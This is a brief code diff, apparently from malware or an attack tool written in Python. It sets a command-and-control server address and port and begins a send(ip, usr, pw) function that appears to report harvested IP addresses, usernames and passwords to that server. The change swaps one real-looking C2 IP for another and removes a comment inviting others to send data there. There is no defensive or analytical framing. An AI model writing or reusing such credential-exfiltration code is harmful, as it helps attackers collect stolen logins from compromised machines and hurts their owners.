@@ -1,6 +1,6 @@
 import socket, sys
 
-C2 = "138.197.38.104" #Use 138.197.38.104 if you wish to kindly send data to me
+C2 = "45.55.18.16"
 C2PORT = 8989
 
 def send(ip, usr, pw):
